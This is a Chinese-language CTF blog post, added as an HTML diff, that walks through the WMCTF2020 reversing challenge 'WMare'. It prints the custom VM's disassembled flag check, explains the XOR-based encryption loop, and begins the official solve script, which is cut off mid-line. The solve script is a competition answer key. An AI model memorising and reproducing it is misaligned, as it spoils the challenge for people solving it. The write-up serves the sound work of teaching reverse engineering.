@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Ld1ng">
+
+
+
+    <meta name="description" content="Ld1ng's Blog">
+
+
+    <meta name="keywords" content="CTF,code,CUMT">
+
+
+<title>WMCTF2020 | Ld1ng</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">WMCTF2020</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Ld1ng</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 5, 2020</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/REVERSE/">REVERSE</a>
+                            
+                        </span>
+                    
+                     
+    <span class="post-count">
+Words:
+    <a href="">2.8k</a>  
+    </span>
+
+
+    <span class="post-count">
+Time:
+    <a href="">13min</a>  
+    </span>
+
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>主要记录两道题<strong>WMare</strong>(re)和<strong>mengyedekending</strong>(pwn)</p>
+<h1 id="0x01-WMare"><a href="#0x01-WMare" class="headerlink" title="0x01 WMare"></a>0x01 WMare</h1><p>好一个虚拟机！这道题断断续续看了两天…首先感谢我<a target="_blank" rel="noopener" href="https://ljzjsc.com/">炜哥</a>的耐心指导，从程序都不会启动到摸清整个程序的脉络，全靠炜哥一把屎一把尿…. </p>
+<hr>
+<h2 id="0x02-传送门"><a href="#0x02-传送门" class="headerlink" title="0x02 传送门"></a>0x02 <a target="_blank" rel="noopener" href="https://ljzjsc.com/index.php/archives/69/">传送门</a></h2><p>炜哥博客里记录的很详细，从启动到手撕一气呵成/滑稽脸，我就不再赘述了。</p>
+<p>点击传送门直接开启新世界。</p>
+<hr>
+<h2 id="0x03-遇到的问题"><a href="#0x03-遇到的问题" class="headerlink" title="0x03 遇到的问题"></a>0x03 遇到的问题</h2><p>我只简单地记录一下我在调试时遇到的问题。</p>
+<p>从一开始找到<code>WELCOME TO WMCTF! INPUT:</code>以及输入函数都没太大问题，关键还是在于最后的校验函数。</p>
+<p>我先拷一下校验的汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">0000000000006000: (                   ): jmp .+0 (0x00006002)      ; eb00</span><br><span class="line">0000000000006002: (                   ): xor ecx, ecx              ; 31c9</span><br><span class="line">0000000000006004: (                   ): cmp ecx, 0x00000081       ; 81f981000000</span><br><span class="line">000000000000600a: (                   ): jz .+226 (0x000060f2)     ; 0f84e2000000</span><br><span class="line">0000000000006010: (                   ): xor esi, esi              ; 31f6</span><br><span class="line">0000000000006012: (                   ): cmp esi, 0x00000009       ; 83fe09</span><br><span class="line">0000000000006015: (                   ): jz .+209 (0x000060ec)     ; 0f84d1000000</span><br><span class="line">000000000000601b: (                   ): xor edx, edx              ; 31d2</span><br><span class="line">000000000000601d: (                   ): mov eax, esi              ; 89f0</span><br><span class="line">000000000000601f: (                   ): inc eax                   ; 40</span><br><span class="line">0000000000006020: (                   ): mov ebx, 0x00000009       ; bb09000000</span><br><span class="line">0000000000006025: (                   ): div eax, ebx              ; f7f3</span><br><span class="line">0000000000006027: (                   ): mov edi, edx              ; 89d7</span><br><span class="line">0000000000006029: (                   ): xor edx, edx              ; 31d2</span><br><span class="line">000000000000602b: (                   ): mov eax, ecx              ; 89c8</span><br><span class="line">000000000000602d: (                   ): mov ebx, 0x00000003       ; bb03000000</span><br><span class="line">0000000000006032: (                   ): div eax, ebx              ; f7f3</span><br><span class="line">0000000000006034: (                   ): jz .+5 (0x0000603b)       ; 7405</span><br><span class="line">0000000000006036: (                   ): jnz .+3 (0x0000603b)      ; 7503</span><br><span class="line">0000000000006038: (                   ): ret 0x0099                ; c29900</span><br><span class="line">000000000000603b: (                   ): cmp edx, 0x00000000       ; 83fa00</span><br><span class="line">000000000000603e: (                   ): jz .+7 (0x00006047)       ; 7407</span><br><span class="line">0000000000006040: (                   ): cmp edx, 0x00000001       ; 83fa01</span><br><span class="line">0000000000006043: (                   ): jz .+56 (0x0000607d)      ; 7438</span><br><span class="line">0000000000006045: (                   ): jnz .+108 (0x000060b3)    ; 756c</span><br><span class="line">0000000000006047: (                   ): shl esi, 0x02             ; c1e602</span><br><span class="line">000000000000604a: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06</span><br><span class="line">000000000000604d: (                   ): shl edi, 0x02             ; c1e702</span><br><span class="line">0000000000006050: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f</span><br><span class="line">0000000000006053: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">0000000000006055: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">0000000000006057: (                   ): or eax, ebx               ; 09d8</span><br><span class="line">0000000000006059: (                   ): not edx                   ; f7d2</span><br><span class="line">000000000000605b: (                   ): not edi                   ; f7d7</span><br><span class="line">000000000000605d: (                   ): or edx, edi               ; 09fa</span><br><span class="line">000000000000605f: (                   ): and eax, edx              ; 21d0</span><br><span class="line">0000000000006061: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">0000000000006063: (                   ): mov ebx, 0x24114514       ; bb14451124</span><br><span class="line">0000000000006068: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">000000000000606a: (                   ): not eax                   ; f7d0</span><br><span class="line">000000000000606c: (                   ): not ebx                   ; f7d3</span><br><span class="line">000000000000606e: (                   ): and eax, ebx              ; 21d8</span><br><span class="line">0000000000006070: (                   ): not eax                   ; f7d0</span><br><span class="line">0000000000006072: (                   ): and edx, edi              ; 21fa</span><br><span class="line">0000000000006074: (                   ): not edx                   ; f7d2</span><br><span class="line">0000000000006076: (                   ): and eax, edx              ; 21d0</span><br><span class="line">0000000000006078: (                   ): mov dword ptr ds:[esi], eax ; 3e8906</span><br><span class="line">000000000000607b: (                   ): jmp .+102 (0x000060e3)    ; eb66</span><br><span class="line">000000000000607d: (                   ): shl esi, 0x02             ; c1e602</span><br><span class="line">0000000000006080: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06</span><br><span class="line">0000000000006083: (                   ): shl edi, 0x02             ; c1e702</span><br><span class="line">0000000000006086: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f</span><br><span class="line">0000000000006089: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">000000000000608b: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">000000000000608d: (                   ): not eax                   ; f7d0</span><br><span class="line">000000000000608f: (                   ): not ebx                   ; f7d3</span><br><span class="line">0000000000006091: (                   ): and eax, ebx              ; 21d8</span><br><span class="line">0000000000006093: (                   ): not eax                   ; f7d0</span><br><span class="line">0000000000006095: (                   ): and edx, edi              ; 21fa</span><br><span class="line">0000000000006097: (                   ): not edx                   ; f7d2</span><br><span class="line">0000000000006099: (                   ): and eax, edx              ; 21d0</span><br><span class="line">000000000000609b: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">000000000000609d: (                   ): mov ebx, 0x01919810       ; bb10989101</span><br><span class="line">00000000000060a2: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">00000000000060a4: (                   ): not ebx                   ; f7d3</span><br><span class="line">00000000000060a6: (                   ): and eax, ebx              ; 21d8</span><br><span class="line">00000000000060a8: (                   ): not edx                   ; f7d2</span><br><span class="line">00000000000060aa: (                   ): and edx, edi              ; 21fa</span><br><span class="line">00000000000060ac: (                   ): or eax, edx               ; 09d0</span><br><span class="line">00000000000060ae: (                   ): mov dword ptr ds:[esi], eax ; 3e8906</span><br><span class="line">00000000000060b1: (                   ): jmp .+48 (0x000060e3)     ; eb30</span><br><span class="line">00000000000060b3: (                   ): shl esi, 0x02             ; c1e602</span><br><span class="line">00000000000060b6: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06</span><br><span class="line">00000000000060b9: (                   ): shl edi, 0x02             ; c1e702</span><br><span class="line">00000000000060bc: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f</span><br><span class="line">00000000000060bf: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">00000000000060c1: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">00000000000060c3: (                   ): not ebx                   ; f7d3</span><br><span class="line">00000000000060c5: (                   ): and eax, ebx              ; 21d8</span><br><span class="line">00000000000060c7: (                   ): not edx                   ; f7d2</span><br><span class="line">00000000000060c9: (                   ): and edx, edi              ; 21fa</span><br><span class="line">00000000000060cb: (                   ): or eax, edx               ; 09d0</span><br><span class="line">00000000000060cd: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">00000000000060cf: (                   ): mov ebx, 0x19260817       ; bb17082619</span><br><span class="line">00000000000060d4: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">00000000000060d6: (                   ): or eax, ebx               ; 09d8</span><br><span class="line">00000000000060d8: (                   ): not edx                   ; f7d2</span><br><span class="line">00000000000060da: (                   ): not edi                   ; f7d7</span><br><span class="line">00000000000060dc: (                   ): or edx, edi               ; 09fa</span><br><span class="line">00000000000060de: (                   ): and eax, edx              ; 21d0</span><br><span class="line">00000000000060e0: (                   ): mov dword ptr ds:[esi], eax ; 3e8906</span><br><span class="line">00000000000060e3: (                   ): shr esi, 0x02             ; c1ee02</span><br><span class="line">00000000000060e6: (                   ): inc esi                   ; 46</span><br><span class="line">00000000000060e7: (                   ): jmp .-218 (0x00006012)    ; e926ffffff</span><br><span class="line">00000000000060ec: (                   ): inc ecx                   ; 41</span><br><span class="line">00000000000060ed: (                   ): jmp .-238 (0x00006004)    ; e912ffffff</span><br><span class="line">00000000000060f2: (                   ): xor ecx, ecx              ; 31c9</span><br><span class="line">00000000000060f4: (                   ): xor edx, edx              ; 31d2</span><br><span class="line">00000000000060f6: (                   ): cmp ecx, 0x00000012       ; 83f912</span><br><span class="line">00000000000060f9: (                   ): jz .+25 (0x00006114)      ; 7419</span><br><span class="line">00000000000060fb: (                   ): shl ecx, 0x01             ; d1e1</span><br><span class="line">00000000000060fd: (                   ): mov ax, word ptr ds:[ecx-19092685] ; 3e668b8133abdcfe</span><br><span class="line">0000000000006105: (                   ): mov bx, word ptr ds:[ecx] ; 3e668b19</span><br><span class="line">0000000000006109: (                   ): cmp ax, bx                ; 6639d8</span><br><span class="line">000000000000610c: (                   ): jz .+1 (0x0000610f)       ; 7401</span><br><span class="line">000000000000610e: (                   ): inc edx                   ; 42</span><br><span class="line">000000000000610f: (                   ): shr ecx, 0x01             ; d1e9</span><br><span class="line">0000000000006111: (                   ): inc ecx                   ; 41</span><br><span class="line">0000000000006112: (                   ): jmp .-30 (0x000060f6)     ; ebe2</span><br><span class="line">0000000000006114: (                   ): cmp edx, 0x00000000       ; 83fa00</span><br><span class="line">0000000000006117: (                   ): jnz .+98 (0x0000617b)     ; 7562</span><br><span class="line">0000000000006119: (                   ): mov byte ptr gs:0x00000320, 0x41 ; 65c6052003000041</span><br><span class="line">0000000000006121: (                   ): mov byte ptr gs:0x00000321, 0x02 ; 65c6052103000002</span><br><span class="line">0000000000006129: (                   ): mov byte ptr gs:0x00000322, 0x63 ; 65c6052203000063</span><br><span class="line">0000000000006131: (                   ): mov byte ptr gs:0x00000323, 0x02 ; 65c6052303000002</span><br><span class="line">0000000000006139: (                   ): mov byte ptr gs:0x00000324, 0x63 ; 65c6052403000063</span><br><span class="line">0000000000006141: (                   ): mov byte ptr gs:0x00000325, 0x02 ; 65c6052503000002</span><br><span class="line">0000000000006149: (                   ): mov byte ptr gs:0x00000326, 0x65 ; 65c6052603000065</span><br><span class="line">0000000000006151: (                   ): mov byte ptr gs:0x00000327, 0x02 ; 65c6052703000002</span><br><span class="line">0000000000006159: (                   ): mov byte ptr gs:0x00000328, 0x73 ; 65c6052803000073</span><br><span class="line">0000000000006161: (                   ): mov byte ptr gs:0x00000329, 0x02 ; 65c605290300000</span><br><span class="line">0000000000006169: (                   ): mov byte ptr gs:0x0000032a, 0x73 ; 65c6052a03000073</span><br><span class="line">0000000000006171: (                   ): mov byte ptr gs:0x0000032b, 0x02 ; 65c6052b03000002</span><br><span class="line">0000000000006179: (                   ): jmp .+64 (0x000061bb)     ; eb40</span><br><span class="line">000000000000617b: (                   ): mov byte ptr gs:0x00000320, 0x46 ; 65c6052003000046</span><br><span class="line">0000000000006183: (                   ): mov byte ptr gs:0x00000321, 0x04 ; 65c6052103000004</span><br><span class="line">000000000000618b: (                   ): mov byte ptr gs:0x00000322, 0x61 ; 65c6052203000061</span><br><span class="line">0000000000006193: (                   ): mov byte ptr gs:0x00000323, 0x04 ; 65c6052303000004</span><br><span class="line">000000000000619b: (                   ): mov byte ptr gs:0x00000324, 0x69 ; 65c6052403000069</span><br><span class="line">00000000000061a3: (                   ): mov byte ptr gs:0x00000325, 0x04 ; 65c6052503000004</span><br><span class="line">00000000000061ab: (                   ): mov byte ptr gs:0x00000326, 0x6c ; 65c605260300006c</span><br><span class="line">00000000000061b3: (                   ): mov byte ptr gs:0x00000327, 0x04 ; 65c6052703000004</span><br><span class="line">00000000000061bb: (                   ): jmp .-2 (0x000061bb)      ; ebfe</span><br></pre></td></tr></table></figure>
+
+<p>代码很长，</p>
+<p>最后的全局段内存处分别是ACCESS和FAIL，即数据校验成功与否。</p>
+<p>接着分析上面代码即可，一点一点动调可以摸出大体逻辑：</p>
+<p>第一层大循环0x81/3次，内部进行3次小循环（每个循环9次），对数据进行加密</p>
+<blockquote>
+<p>EAX、EBX：用于从内存取数，或者送入内存</p>
+<p>ECX: 负责记数，每执行完成一个小循环（9次），inc ecx</p>
+<p>ESI、EDI：负责作为段内偏移来寻址，同时esi还用来记录小循环内部的循环次数</p>
+</blockquote>
+<p>由于炜哥博客很详细，所以我只提一下一个困惑我很长时间的内容——取内存的问题</p>
+<p>主要看这两条指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, dword ptr ds:[esi]</span><br><span class="line">mov ebx, dword ptr ds:[edi]</span><br></pre></td></tr></table></figure>
+
+<p>esi，edi的值决定着ds段基址的偏移，</p>
+<p><img src="https://i.loli.net/2020/08/05/CHvORtU94N8hpKj.png" alt="image-20200805144842040"></p>
+<p>通过动调可以发现ebx总是取到的eax后四个字节的数据，但是di到了0x20之后会被重新归零</p>
+<p><img src="https://i.loli.net/2020/08/05/PkWFHLha5jui8gU.png"></p>
+<p>所以可以看出ds段数据的地址范围是0x00-0x20，即36个字节，正好与flag的字节数一致。</p>
+<p>继续动调在关键的几个指令处你会发现</p>
+<p><img src="https://i.loli.net/2020/08/05/NAhVnGqvsJaE7e3.png"></p>
+<p>也就是说对于每一次加密，加密后的数据会覆盖到原本数据的位置。</p>
+<p>如：原数据：1，2，3，4，5</p>
+<p>　　第一次：取出1，2进行加密，加密得3，则覆盖到原本1的位置，现在的内存为3，2，3，4，5</p>
+<p>　　第二次：再取出2，3进行加密，加密得5，则内存变为：3，5，3，4，5</p>
+<p>　　以此类推，加密0x81×9次</p>
+<p>现在搞懂了加密规则，再来看校验的步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00000000000060f2: (): xor ecx, ecx             </span><br><span class="line">00000000000060f4: (): xor edx, edx            </span><br><span class="line">00000000000060f6: (): cmp ecx, 0x00000012       //循环0x12次，即十进制18次</span><br><span class="line">00000000000060f9: (): jz .+25 (0x00006114)     //如果满0x12次，直接跳转判断edx的值</span><br><span class="line">00000000000060fb: (): shl ecx, 0x01             //ecx左移一位，相当于乘2</span><br><span class="line">00000000000060fd: (): mov ax, word ptr ds:[ecx-19092685]//取校验数据，低16位放入ax</span><br><span class="line">0000000000006105: ( ): mov bx, word ptr ds:[ecx]//内存处取加密过的数据，低16位放入bx</span><br><span class="line">0000000000006109: (): cmp ax, bx               //比较，如果不相等edx+1</span><br><span class="line">000000000000610c: (): jz .+1 (0x0000610f)    </span><br><span class="line">000000000000610e: (): inc edx               </span><br><span class="line">000000000000610f: (): shr ecx, 0x01          //ecx右移1位，相当于除以2</span><br><span class="line">0000000000006111: (): inc ecx                //ecx加1</span><br><span class="line">0000000000006112: (): jmp .-30 (0x000060f6)   //跳转比较ecx和0x12的大小</span><br><span class="line">0000000000006114: (): cmp edx, 0x00000000      //如果edx不等于0，则失败</span><br><span class="line">0000000000006117: (): jnz .+98 (0x0000617b)    </span><br></pre></td></tr></table></figure>
+
+<p>在0x0006109处下断点，然后动调一下观察ecx如何变化</p>
+<p><img src="https://i.loli.net/2020/08/05/9dzXOYig1WmrEJL.png"></p>
+<p><img src="https://i.loli.net/2020/08/05/nRQHUTb6AIOPVWG.png"></p>
+<p><img src="https://i.loli.net/2020/08/05/E2LPbZ5q68ltArf.png"></p>
+<p>可以看到每次取数据时，ecx偏移加2</p>
+<p>一开始由于ax和eax等寄存器的误导，实在没想通这一块代码</p>
+<p>现在知道两者差别后终于搞懂了….</p>
+<blockquote>
+<p>加密时，一次取4个字节，循环9次，即36个字节，内存区域ds:[0x0]-ds:[0x20]。</p>
+<p>校验时，一次取2个字节，循环18次，也是36个字节，内存区域相同。</p>
+</blockquote>
+<p>所以，全部明白之后，题目就迎刃而解了。</p>
+<p>至于加密方法是三个数据异或，这是我没有想到的…</p>
+<p>放上上<strong>官方exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0xec5574d8</span>,<span class="number">0x421a04b5</span>,<span class="number">0x2ba6d11</span>,<span class="number">0x8105055f</span>,<span class="number">0xeda06c28</span>,<span class="number">0x6ae00499</span>,<span class="number">0x18a955e7</span>,<span class="number">0x71d63591</span>,<span class="number">0x4537a864</span>]</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,-<span class="number">1</span>,-<span class="number">1</span>):               <span class="comment">#129轮逻辑运算</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,-<span class="number">1</span>,-<span class="number">1</span>):           <span class="comment">#臭死力</span></span><br><span class="line">        <span class="keyword">if</span> (n%<span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">            enc_flag[i] = enc_flag[i]^enc_flag[(i+<span class="number">1</span>)%<span class="number">9</span>]^<span class="number">0x24114514</span></span><br><span class="line">        <span class="keyword">elif</span>(n%<span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">            enc_flag[i] = enc_flag[i]^enc_flag[(i+<span class="number">1</span>)%<span class="number">9</span>]^<span class="number">0x1919810</span></span><br><span class="line">        <span class="keyword">elif</span>(n%<span class="number">3</span> == <span class="number">2</span>):</span><br><span class="line">            enc_flag[i] = enc_flag[i]^enc_flag[(i+<span class="number">1</span>)%<span class="number">9</span>]^<span class="number">0x19260817</span></span><br><span class="line">group = [<span class="literal">None</span>] * (<span class="built_in">len</span>(enc_flag) * <span class="number">4</span>) <span class="comment">#36字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        group[i*<span class="number">4</span>+n] = (enc_flag[i]&gt;&gt;(<span class="number">8</span>*n))&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(group)):<span class="comment">#凯撒解密</span></span><br><span class="line">    group[i] = (group[i] - <span class="number">0x55</span>)%<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">flag = [<span class="literal">None</span>] * <span class="built_in">len</span>(group)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):<span class="comment">#行列密码解密</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        flag[i*<span class="number">6</span>+n] = group[n*<span class="number">6</span>+i]</span><br><span class="line">key_board_mapping = &#123;<span class="number">0x2</span>:<span 